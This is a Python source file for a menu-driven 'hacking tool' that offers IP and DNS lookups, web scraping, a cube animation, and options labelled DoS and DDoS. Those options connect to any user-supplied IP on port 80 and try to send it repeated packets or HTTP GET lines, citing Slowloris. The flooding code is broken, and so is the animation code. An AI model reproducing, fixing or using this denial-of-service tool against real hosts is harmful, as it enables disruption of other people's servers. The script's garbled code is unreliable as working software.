#by Aqwoz
#██╗    ██╗███████╗██████╗ ██████╗ ██╗███████╗████████╗
#██║    ██║██╔════╝██╔══██╗██╔══██╗██║██╔════╝╚══██╔══╝
#██║ █╗ ██║█████╗  ██████╔╝██████╔╝██║███████╗   ██║   
#██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██║╚════██║   ██║   
#╚███╔███╔╝███████╗██████╔╝██████╔╝██║███████║   ██║   
# ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝   
                                                      

from bs4 import BeautifulSoup
import requests
import os
import sys
import time
import random
import json
import socket
from scapy.all import *
import ifcfg
import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D
from matplotlib.animation import FuncAnimation


print("""

██╗    ██╗███████╗██████╗ ██████╗ ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔══██╗██║██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝██████╔╝██║███████╗   ██║   
██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██║╚════██║   ██║   
╚███╔███╔╝███████╗██████╔╝██████╔╝██║███████║   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝   
   (c) MIT License by Aqwoz
      (Educational Purpose Only!)                                                  

""")

time.sleep(1)

print("[1] Get IP Info")
print("[2] Get Web Info")
print("[3] Get Net Info(unavailable)")
print("[4] DoS")
print("[5] DdoS")
print("[6] DNS lookup")
print("[7] Wanna have fun? :)")
print("[99] Exit")


choice = input("[*] Enter your choice: ")

if choice == "1":
    ip = input("[*] Enter IP: ")
    print("[*] Requesting info...")
    r = requests.get(f"https://ipinfo.io/{ip}")
    data = r.json()
    print("[*] IP Info:")
    print(f"IP: {data['ip']}")
    print(f"Hostname: {data['hostname']}")
    print(f"City: {data['city']}")
    print(f"Region: {data['region']}")
    print(f"Country: {data['country']}")
    print(f"Location: {data['loc']}")
    print(f"Postal: {data['postal']}")

elif choice == "2":
    url= input("[*] Enter URL: ")
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    parags = soup.find_all("p")
    for p in parags:
        print(p.text)

elif choice == "3":
    print(":( unavailable")

elif choice == "4":
    ip = input("[*] Enter IP: ")
    packet_name = input("[*] What do you want to name the packet: ")
    howmuch = int(input("[*] How many packets do you want to send: "))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, 80))
    sock.sendto((ip, 80))*howmuch

elif choice == "5":
    print("It will work if website have HTTP bugs/Slowlorris bug")
    os.system("clear")
    time.sleep(1)
    ip = input("[*] Enter IP: ")
    packet_name = input("[*] What do you want to name the packet: ")
    howmuch = int(input("[*] How many packets do you want to send: "))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, 80))
    sock.sendto(("GET /" + packet_name + " HTTP/1.1\r\n").encode(), (ip, 80))*howmuch

elif choice == "6":
    dns = input("[*] Enter DNS: ")
    print(socket.gethostbyname(dns))

elif choice == "7":
    fig = plt.figure()
    ax = fig.add_subplot(111, projection='3d')

# Define the vertices of the cube
    vertices = np.array([[0, 0, 0], [1, 0, 0], [1, 1, 0], [0, 1, 0],
                     [0, 0, 1], [1, 0, 1], [1, 1, 1], [0, 1, 1]])

# Define the edges of the cube
    edges = [[0, 1], [1, 2], [2, 3], [3, 0],
         [4, 5], [5, 6], [6, 7], [7, 4],
         [0, 4], [1, 5], [2, 6], [3, 7]]

    def update(num):
        ax.cla()
    
    angle = sum * 4 # type: ignore
    rotation_matrix = np.array([[np.cos(np.radians(angle)), -np.sin(np.radians(angle)), 0],
                                [np.sin(np.radians(angle)), np.cos(np.radians(angle)), 0],
                                [0, 0, 1]])
    rotated_vertices = np.dot(vertices, rotation_matrix.T)
    for edge in edges:
        ax.plot3D(*zip(*rotated_vertices[edge]), color='b')
    ax.set_xlim(-1, 2)
    ax.set_ylim(-1, 2)
    ax.set_zlim(-1, 2)

    ani = FuncAnimation(fig, update, frames=90, interval=100)
    plt.show()

elif choice == "99":
    sys.exit()